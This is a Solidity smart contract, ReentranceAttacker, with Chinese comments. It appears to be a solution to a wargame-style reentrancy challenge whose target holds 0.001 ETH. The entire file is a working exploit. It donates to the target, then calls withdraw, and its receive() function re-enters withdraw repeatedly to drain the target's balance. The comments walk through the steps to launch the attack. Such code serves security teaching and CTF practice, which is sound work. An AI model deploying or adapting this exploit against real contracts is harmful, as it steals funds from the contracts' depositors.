// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceAttacker {
    IReentrance public target;
    // Reentrance 的初始餘額是 0.001 ETH (1000000000000000 Wei)
    uint256 public amount = 1000000000000000;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    // 記得參數填入自己的地址
    // Reentrance 的初始餘額是 0.001 ETH，要捐贈大於等於 0.001 ETH 
    // 使得 balances[msg.sender] >= _amount 才能發動重入攻擊
    function donate(address _to) public payable {
        target.donate(_to);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return target.balanceOf(_who);
    }

    function withdraw(uint256 _amount) public {
        target.withdraw(_amount);
    }

    receive() external payable {
        target.withdraw(amount);
    }

}

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}